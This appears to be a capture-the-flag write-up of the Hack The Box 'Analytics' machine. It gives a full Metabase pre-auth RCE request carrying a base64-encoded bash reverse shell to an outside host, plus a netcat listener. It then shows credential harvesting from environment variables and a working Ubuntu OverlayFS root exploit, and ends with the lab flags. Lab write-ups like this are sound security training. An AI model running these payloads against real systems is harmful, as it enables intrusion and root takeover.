---
title: "Analytics from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# Analytics from HTB
[page](https://app.hackthebox.com/machines/Analytics)

`nmap`gave this:
```bash
 nmap -sCV 10.10.11.233
 PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Analytical
|_http-server-header: nginx/1.18.0 (Ubuntu)
```
Nothing unusual.
I added site address to `/etc/hosts`:
```
10.10.11.233 analytical.htb
```
I went to the site and i pressed `login`which led me to different subdomain and i added it to `/etc/hosts`to access it:
```
10.10.11.233 data.analytical.htb
```
It led me to `login page`and it was `metabase`. To discover the version of `metabase`i used `curl`and `grep`:
```
curl http://data.analytical.htb/ | grep version
..............
"version":{"date":"2023-06-29","tag":"v0.46.6",
.............
```
Then went to search for `Exploit` and found this site:
https://www.assetnote.io/resources/research/chaining-our-way-to-pre-auth-rce-in-metabase-cve-2023-38646
First we need token, i used `curl and grep` again:
```
curl http://data.analytical.htb/auth/api/setup/validate | grep token
........................
token":"249fa03d-fd94-4d5b-b94f-b4ebf3df681f"
......................
```
I copied the payload on The link above for `reverse shell` and i sent the payload in `Burpsuite`:
```
POST /api/setup/validate HTTP/1.1
Host: data.analytical.htb
Content-Length: 816
Accept: application/json
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Content-Type: application/json
Sec-GPC: 1
Accept-Language: en-US,en;q=0.6
Origin: http://data.analytical.htb
Referer: http://data.analytical.htb/auth/login?redirect=%2F
Accept-Encoding: gzip, deflate, br
Cookie: metabase.DEVICE=c4db9e82-ac15-462e-9258-c2018034f04a
Connection: keep-alive

{
    "token": "249fa03d-fd94-4d5b-b94f-b4ebf3df681f",
    "details":
    {
        "is_on_demand": false,
        "is_full_sync": false,
        "is_sample": false,
        "cache_ttl": null,
        "refingerprint": false,
        "auto_run_queries": true,
        "schedules":
        {},
        "details":
        {
            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE2LjIvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}')\n$$--=x",
            "advanced-options": false,
            "ssl": true
        },
        "name": "an-sec-research-team",
        "engine": "h2"
    }
}
```
`YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE2LjIvMTIzNCAwPiYx`is `base64`encoded payload:
`bash -i >&/dev/tcp/10.10.16.2/1234 0>&1`. Paste that in the payload, start `NetCat on port 1234`and You will get the connection:
```bash
 rlwrap nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.11.233] 46884
bash: cannot set terminal process group (1): Not a tty
bash: no job control in this shell
566446a9a35c:/$
```
 I couldn't activate shell here so i went to search for something. I'm not an user. Can't find flag.
 I used `env`command and found this:
 ```bash
   env
SHELL=/bin/sh
MB_DB_PASS=
HOSTNAME=566446a9a35c
LANGUAGE=en_US:en
MB_JETTY_HOST=0.0.0.0
JAVA_HOME=/opt/java/openjdk
MB_DB_FILE=//metabase.db/metabase.db
PWD=/metabase.db
LOGNAME=metabase
MB_EMAIL_SMTP_USERNAME=
HOME=/home/metabase
LANG=en_US.UTF-8
META_USER=metalytics
META_PASS=An4lytics_ds20223#
MB_EMAIL_SMTP_PASSWORD=
USER=metabase
SHLVL=4
MB_DB_USER=
FC_LANG=en-US
LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib
LC_CTYPE=en_US.UTF-8
MB_LDAP_BIND_DN=
LC_ALL=en_US.UTF-8
MB_LDAP_PASSWORD=
PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MB_DB_CONNECTION_URI=
JAVA_VERSION=jdk-11.0.19+7
_=/usr/bin/env
OLDPWD=/
```
I got the credentials:
>Username
>  metalytics

>Password
>   An4lytics_ds20223#

I then went to `ssh`and got the connection.
```bash
ssh metalytics@10.10.11.233
Password: An4lytics_ds20223#
metalytics@analytics:~$ ls
user.txt
metalytics@analytics:~$ cat user.txt
142306c920c6a937dad19b17c8b70c06
```
***
User Flag: 142306c920c6a937dad19b17c8b70c06
***
I can't run anything with `root permission`:
```bash
 sudo -l
 Sorry, user metalytics may not run sudo on localhost.
```
`env`command gave me nothing. Then i went for searching exploits. And with `uname -r`version of kernel was exploitable.
Eventually i got to this site:
https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/   which game me code for privilege escalation:
```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*; u/python3 -c 'import os;os.setuid(0);os.system(\"bash")'"
```
Run this command to become `root`but wait you are not `true root` :D.
After you become the `fake root`you need to run this commands one by one:
```bash
rm -r l m u w
mkdir exploit
cd exploit
mkdir l w u m
cp /usr/bin/python3 l/
setcap cap_setuid+eip l/python3
mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m
touch m/*
u/python3
>>> import os
>>> os.setuid(0)
>>> os.system("bash")
root@analytics:~# cat /root/root.txt
ff608ad0bf165bcccd6516b9bf5ef8d1
```
***
Root Flag is: ff608ad0bf165bcccd6516b9bf5ef8d1
***
![](/assets/images/Screenshot from 2024-08-09 15-06-52.png)
